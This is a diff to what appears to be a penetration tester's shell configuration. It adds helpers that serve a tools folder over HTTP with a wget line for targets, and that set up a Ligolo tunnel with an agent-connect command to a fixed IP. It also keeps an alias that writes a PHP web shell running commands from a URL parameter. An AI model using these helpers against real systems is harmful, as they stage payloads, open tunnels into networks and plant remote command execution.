@@ -18,6 +18,14 @@ set_target() {
   echo "$1" > ~/.config/bin/target && export IP=$1
 }
 
+transfer(){
+  sudo python3 -m http.server 80 --directory ~/tools; echo "wget http://$ip_tun0/" | tr -d '\n' | xclip -sel clip
+}
+
+ligolo(){
+  sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;cd ~/Ligolo;sudo ./proxy -selfcert; echo "./agent -connect 172.23.10.109:11601 -ignore-cert" | tr -d '\n' | xclip -sel clip 
+}
+
 alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"
 
 alias server="sudo python3 -m http.server 80"
@@ -25,5 +33,3 @@ alias server="sudo python3 -m http.server 80"
 alias target="cat ~/.config/bin/target | tr -d '\n' | xclip -sel clip"
 
 alias phpcmd='echo "<?php system(\$_GET[\"cmd\"]); ?>" | tee webshell.php'
-
-alias aliases='tail -n +116 ~/.zshrc'
